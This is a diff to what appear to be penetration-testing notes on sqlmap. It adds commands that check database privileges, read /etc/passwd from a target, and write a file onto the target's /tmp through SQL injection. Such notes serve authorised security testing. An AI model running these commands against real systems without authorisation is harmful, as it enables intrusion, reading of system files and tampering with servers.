@@ -79,6 +79,21 @@ sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --thr
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
 ```
 
+```bash
+# Check privileges
+sqlmap -r request --privileges
+```
+
+```bash
+# Read a file
+sqlmap -r request --file-read=/etc/passwd
+```
+
+```bash
+# Write a file
+sqlmap -r request --file-write=./test.txt --file-dest=/tmp/test.txt
+```
+
 #### tamper.py template
 
 ```python
